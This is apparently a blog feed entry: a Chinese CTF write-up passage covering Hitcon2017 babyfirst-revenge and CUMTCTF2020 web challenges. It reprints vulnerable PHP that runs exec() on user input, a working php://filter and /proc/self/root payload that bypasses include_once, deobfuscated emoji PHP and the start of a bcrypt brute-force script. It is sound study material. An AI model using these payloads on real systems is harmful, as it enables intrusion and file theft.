<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pz1o</title>
  
  <subtitle>Pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2020-11-20T14:19:52.357Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>Pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>复现wp</title>
    <link href="https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/"/>
    <id>https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/</id>
    <published>2099-09-28T02:18:17.000Z</published>
    <updated>2020-11-20T14:19:52.357Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>github复现地址</p><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>命令执行构造反弹shell</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>先说几个知识点：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure><p>在linux中换行可以执行间断的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //在1下写入cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过</p></blockquote><h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h2><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>require_once绕过</p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure><p>这里主要问题是<code>reuqire_once</code>的问题</p><p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p><p>这里面的源码解析有得还是看不懂，日后再翻</p><p>首先说一下php文件包含的机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再<code>require_once</code>。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>/proc/self指向当前进程的/proc/pid/</p><p>/proc/self/root/指向/的符号</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p></blockquote><h2 id="👍🙌😃"><a href="#👍🙌😃" class="headerlink" title="👍🙌😃"></a>👍🙌😃</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>代码格式化、反混淆，bcrypt爆破，<strong>命令执行</strong></p><p>这个题 我只能说真的牛逼</p><p>真的开眼界 还可以这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$🙐=<span class="keyword">array</span>(<span class="string">'🙐'</span>,<span class="string">'🙑'</span>,<span class="string">'🙒'</span>,<span class="string">'🙓'</span>,<span class="string">'🙔'</span>,<span class="string">'🙕'</span>,<span class="string">'🙖'</span>,<span class="string">'🙗'</span>,<span class="string">'🙘'</span>,<span class="string">'🙙'</span>,<span class="string">'🙚'</span>,<span class="string">'🙛'</span>,<span class="string">'🙜'</span>,<span class="string">'🙝'</span>,<span class="string">'🙞'</span>,<span class="string">'🙟'</span>);</span><br><span class="line">$🙠=<span class="keyword">array</span>(<span class="string">'🙠'</span>,<span class="string">'🙡'</span>,<span class="string">'🙢'</span>,<span class="string">'🙣'</span>,<span class="string">'🙤'</span>,<span class="string">'🙥'</span>,<span class="string">'🙦'</span>,<span class="string">'🙧'</span>,<span class="string">'🙨'</span>,<span class="string">'🙩'</span>,<span class="string">'🙪'</span>,<span class="string">'🙫'</span>,<span class="string">'🙬'</span>,<span class="string">'🙭'</span>,<span class="string">'🙮'</span>,<span class="string">'🙯'</span>);</span><br><span class="line">$🙰=<span class="keyword">array</span>(<span class="string">'🙰'</span>,<span class="string">'🙱'</span>,<span class="string">'🙲'</span>,<span class="string">'🙳'</span>,<span class="string">'🙴'</span>,<span class="string">'🙵'</span>,<span class="string">'🙶'</span>,<span class="string">'🙷'</span>,<span class="string">'🙸'</span>,<span class="string">'🙹'</span>,<span class="string">'🙺'</span>,<span class="string">'🙻'</span>,<span class="string">'🙼'</span>,<span class="string">'🙽'</span>,<span class="string">'🙾'</span>,<span class="string">'🙿'</span>);</span><br><span class="line">$😀=<span class="keyword">array</span>(<span class="string">'😀'</span>,<span class="string">'😁'</span>,<span class="string">'😂'</span>,<span class="string">'😃'</span>,<span class="string">'😄'</span>,<span class="string">'😅'</span>,<span class="string">'😆'</span>,<span class="string">'😇'</span>,<span class="string">'😈'</span>,<span class="string">'😉'</span>,<span class="string">'😊'</span>,<span class="string">'😋'</span>,<span class="string">'😌'</span>,<span class="string">'😍'</span>,<span class="string">'😎'</span>,<span class="string">'😏'</span>);</span><br><span class="line">$😐=<span class="keyword">array</span>(<span class="string">'😐'</span>,<span class="string">'😑'</span>,<span class="string">'😒'</span>,<span class="string">'😓'</span>,<span class="string">'😔'</span>,<span class="string">'😕'</span>,<span class="string">'😖'</span>,<span class="string">'😗'</span>,<span class="string">'😘'</span>,<span class="string">'😙'</span>,<span class="string">'😚'</span>,<span class="string">'😛'</span>,<span class="string">'😜'</span>,<span class="string">'😝'</span>,<span class="string">'😞'</span>,<span class="string">'😟'</span>);</span><br><span class="line">$😠=<span class="keyword">array</span>(<span class="string">'😠'</span>,<span class="string">'😡'</span>,<span class="string">'😢'</span>,<span class="string">'😣'</span>,<span class="string">'😤'</span>,<span class="string">'😥'</span>,<span class="string">'😦'</span>,<span class="string">'😧'</span>,<span class="string">'😨'</span>,<span class="string">'😩'</span>,<span class="string">'😪'</span>,<span class="string">'😫'</span>,<span class="string">'😬'</span>,<span class="string">'😭'</span>,<span class="string">'😮'</span>,<span class="string">'😯'</span>);</span><br><span class="line">$😰=<span class="keyword">array</span>(<span class="string">'😰'</span>,<span class="string">'😱'</span>,<span class="string">'😲'</span>,<span class="string">'😳'</span>,<span class="string">'😴'</span>,<span class="string">'😵'</span>,<span class="string">'😶'</span>,<span class="string">'😷'</span>,<span class="string">'😸'</span>,<span class="string">'😹'</span>,<span class="string">'😺'</span>,<span class="string">'😻'</span>,<span class="string">'😼'</span>,<span class="string">'😽'</span>,<span class="string">'😾'</span>,<span class="string">'😿'</span>);</span><br><span class="line">$🙀=<span class="keyword">array</span>(<span class="string">'🙀'</span>,<span class="string">'🙁'</span>,<span class="string">'🙂'</span>,<span class="string">'🙃'</span>,<span class="string">'🙄'</span>,<span class="string">'🙅'</span>,<span class="string">'🙆'</span>,<span class="string">'🙇'</span>,<span class="string">'🙈'</span>,<span class="string">'🙉'</span>,<span class="string">'🙊'</span>,<span class="string">'🙋'</span>,<span class="string">'🙌'</span>,<span class="string">'🙍'</span>,<span class="string">'🙎'</span>,<span class="string">'🙏'</span>);</span><br><span class="line">$🏁 = <span class="keyword">array</span>($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);</span><br><span class="line">$😳😃😢🙉😲😗😦🙅 = <span class="string">"strlen"</span>;</span><br><span class="line">$😩😂😸🙉 = <span class="string">"chr"</span>;</span><br><span class="line">$🎁 = <span class="string">"base64_decode"</span>;</span><br><span class="line">$😱😨😞🙊😪😨😡😍 = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line"><span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">$😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]);</span><br><span class="line">😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line">😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123;</span><br><span class="line">@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];</span><br><span class="line">$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($🔑, $🔒)) &#123;</span><br><span class="line"><span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line"><span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line">😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是代码格式化，接着就是<strong>理解代码的执行逻辑，顺便改变代码逻辑</strong></p><p>看题解上看的是第一个函数，也就是混淆</p><p>为什么要先看第一个函数</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p><p>所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"加密后："</span>.$😳😃😢🙉;</span><br><span class="line"><span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line"><span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"原文："</span>.(<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后依次修改代码逻辑，替换其中第一个函数输出结果</p><p>核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">mkdir($path);</span><br><span class="line">chdir($path);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$🔑 = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$🔒 = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发现有composer包，安装，然后查资料bcrypt</p><h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。</p><p><strong><code>bcrypt</code>是一种单向哈希算法。</strong>如果不知道盐，圆<strong>和密码</strong>（密码），则无法检索纯文本密码。</p><blockquote><p>加盐：</p><p>就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。</p></blockquote><p>在php中，主要有内置的函数<code>password_hash</code>和<code>password_verify</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出信息</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//相应的cost也会变为11；</span></span><br></pre></td></tr></table></figure><p>接下来就是爆破，已知密码为bcrypt+4位小写字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span 